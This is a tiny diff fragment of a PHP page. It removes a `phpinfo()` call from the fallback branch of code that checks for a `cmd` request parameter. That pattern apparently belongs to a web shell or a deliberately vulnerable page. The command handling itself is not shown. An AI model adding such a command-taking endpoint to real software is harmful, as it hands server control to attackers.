@@ -38,5 +38,4 @@ if (isset($_GET['cmd']) === true) {
   }
 } else {
   print('<h1>Hello World</h1>');
-  phpinfo();
 } ?>
